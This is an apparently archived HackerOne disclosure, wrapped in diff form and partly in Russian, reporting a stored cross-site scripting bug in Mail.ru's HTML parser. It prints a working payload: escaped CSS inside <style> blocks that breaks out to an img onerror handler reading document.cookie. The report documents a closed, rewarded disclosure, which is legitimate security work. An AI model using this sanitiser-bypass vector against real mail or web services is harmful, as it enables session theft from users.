@@ -1,0 +1,29 @@
+ReportLink:https://hackerone.com/reports/277163
+WeaknessName:Cross-site Scripting (XSS) - Stored
+Reporter:https://hackerone.com/maxarr
+ReportedTo:Mail.ru(mailru)
+BountyAmount:1000.0
+Severity:high
+State:Closed
+DateOfDisclosure:26.01.2018 14:18:40
+
+Summary:
+XSS via malformed message body <style> blocks.
+Здравствуйте!
+Бага в тестируемом HTML парсере. В блочных стилях <style></style>
+
+Рабочий код:
+
+<style>
+\#test{
+background-image:url('//\27\29\3Bcw:;a:\')\3b\3C/style/\20;a:\28\27\27');
+background-image:url('//\27\29\3Bcw:;a:\')\3b>;a:\28\27\27');
+}
+\#p{
+background-image:url('//\27\29\3Bcw:;a:\')\3b<img/src=\'dfdfd\'//onerror=\'alert(document.cookie)\'>;a:\28\27\27');
+}
+</style></style>
+
+В аттаче txt файл с вектором.
+
+С уважением, Максим.
